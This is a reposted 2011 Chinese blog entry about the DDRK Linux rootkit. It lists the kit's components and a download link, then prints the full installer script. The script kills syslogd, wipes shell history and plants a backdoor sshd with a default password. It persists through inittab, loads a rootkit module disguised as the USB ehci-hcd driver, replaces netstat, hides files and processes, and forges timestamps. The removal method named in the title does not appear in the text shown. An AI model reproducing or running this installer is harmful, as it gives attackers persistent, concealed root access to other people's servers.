title: Linux下rootkit-ddrk攻击获得root权限以及清除方法[转]
categories: [网络安全]
tags: []
date: 2011-06-27 11:10:00
---
<p></p><p></p><p></p><p>DDRK是一个Linux结合shv和adore-ng优点，内核级别的rootkit。</p><p>DDRK中包含的文件：</p><p>netstat &nbsp;#替换系统中的netstat，从ssh配置文件中读取端口并隐藏</p><p>rk.ko &nbsp;#内核模块，实现文件和进程的隐藏功能</p><p>setup &nbsp;#rootkit安装文件</p><p>tty &nbsp;#ava工具</p><p>bin.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---ttymon</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---sshd.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---.sh</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shdcf2 &nbsp;#sshd配置文件</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk.pub</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shrs</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---sshd &nbsp;#sshd主程序</p><p>DDRK下载地址：http://www.sectop.com/soft/ddrk.tgz</p><p>因此只要把这些文件上传到服务器上并成功运行，就可以获得该服务器的root权限。为所欲为，无所不能。</p><p>&nbsp;</p><p>setup内容如下：</p><p>#!/bin/bash</p><p>&nbsp;</p><p>##########define variables##########</p><p>DEFPASS=123456 &nbsp; &nbsp;//默认密码</p><p>DEFPORT=43958 &nbsp; &nbsp;//默认端口</p><p>BASEDIR=`pwd`</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>&nbsp;</p><p>##########check is root##########</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;BECOME ROOT AND TRY AGAIN&quot;</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>&nbsp;</p><p>##########extract all tar##########</p><p>tar zxf bin.tgz</p><p>cd bin</p><p>tar zxf sshd.tgz</p><p>rm -rf ./sshd.tgz</p><p>cd $BASEDIR</p><p>rm -rf bin.tgz</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>##########kill syslogd##########</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>sleep 2</p><p>&nbsp;</p><p>##########remove sh.conf##########</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; rm -rf /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; //经过md5sum加密过的密码文件</p><p>fi</p><p>&nbsp;</p><p>##########initialize sshd configuration##########</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using Password : $1&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No Password Specified, using default - $DEFPASS&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using ssh-port : $2&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No ssh-port Specified, using default - $DEFPORT&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>fi</p><p>&nbsp;</p><p>###########creating dirs##########</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/</p><p>mv .sh/.bashrc $HOMEDIR</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload</p><p>chmod a+xr /sbin/ttyload</p><p>chmod o-w /sbin/ttyload</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon</p><p>chmod a+xr /sbin/ttymon</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p>##########modify inittab##########</p><p>cp /etc/inittab /etc/.inittab</p><p>sed -e 's@^1:2345@0:2345:once:/usr/sbin/ttyloadn&amp;@' /etc/inittab &gt; /etc/.inittab</p><p>touch -acmr /etc/inittab /etc/.inittab</p><p>mv -f /etc/.inittab /etc/inittab</p><p>&nbsp;</p><p>echo &quot;/sbin/ttyload -q &gt; /dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>&nbsp;</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod 755 /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /bin/ls /etc/inittab</p><p>&nbsp;</p><p>###########make sure inittab has modified##########</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;# WARNING - SSHD WONT BE RELOADED UPON RESTART &quot;</p><p>&nbsp; &nbsp;echo &quot;# inittab shuffling probly fucked-up ! &quot;</p><p>fi</p><p>&nbsp;</p><p>##########load rk.ko##########</p><p>cd $BASEDIR</p><p>modprobe -r ehci-hcd</p><p>mv -f rk.ko /lib/modules/`uname -r`/kernel/drivers/usb/host/ehci-hcd.ko</p><p>modprobe ehci-hcd</p><p>mv tty $HOMEDIR</p><p>&nbsp;</p><p>##########replace netstat##########</p><p>touch -acmr /bin/netstat netstat</p><p>mv -f netstat /bin/netstat</p><p>&nbsp;</p><p>##########hide all files and process##########</p><p>$HOMEDIR/tty h /etc/sh.conf &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /lib/libsh.so &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/lib/libsh &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttymon &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########load rk.ko on boot##########</p><p>cat &gt; /etc/sysconfig/modules/ehci.modules &lt;&lt; EOF</p><p>#!/bin/sh</p><p>#install usb modules support</p><p>modprobe -r ehci-hcd</p><p>modprobe ehci-hcd</p><p>EOF</p><p>touch -amcr /bin/ls /etc/sysconfig/modules/ehci.modules</p><p>&nbsp;</p><p>chmod 755 /etc/sysconfig/modules/ehci.modules</p><p>$HOMEDIR/tty h /etc/sysconfig/modules/ehci.modules &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########check iptables setting##########</p><p>if [ -f /sbin/iptables ]; then</p><p>&nbsp; &nbsp;echo &quot;`/sbin/iptables -L INPUT | head -5`&quot;</p><p>else</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;echo &quot;# lucky for u no iptables found&quot;</p><p>fi</p><p>&nbsp;</p><p>##########start syslogd##########</p><p>/sbin/syslogd -m 0</p><p>&nbsp;</p><p># ./setup 123 3333 &nbsp; &nbsp;//设
